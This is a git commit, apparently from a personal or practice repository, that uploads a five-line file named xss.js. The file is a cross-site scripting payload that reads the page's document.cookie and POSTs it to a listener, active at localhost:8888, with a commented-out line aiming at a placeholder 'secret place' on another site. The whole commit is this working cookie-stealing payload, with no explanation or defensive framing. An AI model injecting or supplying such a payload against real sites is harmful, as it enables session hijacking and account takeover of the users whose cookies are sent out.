4c291130f17c44653f073e87db2748a9c402a93b
uncomfortableunicorn999 <114950226+uncomfortableunicorn999@users.noreply.github.com>
2023-03-07 11:09:19 -0500

    Add files via upload

---
+++ xss.js
@@ -0,0 +1,5 @@
+var xhr = new XMLHttpRequest();
+        //xhr.open("POST", "http://some-site.com/some-secret-place", true);
+        xhr.open("POST", "http://localhost:8888", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+        xhr.send("cookie="+document.cookie);
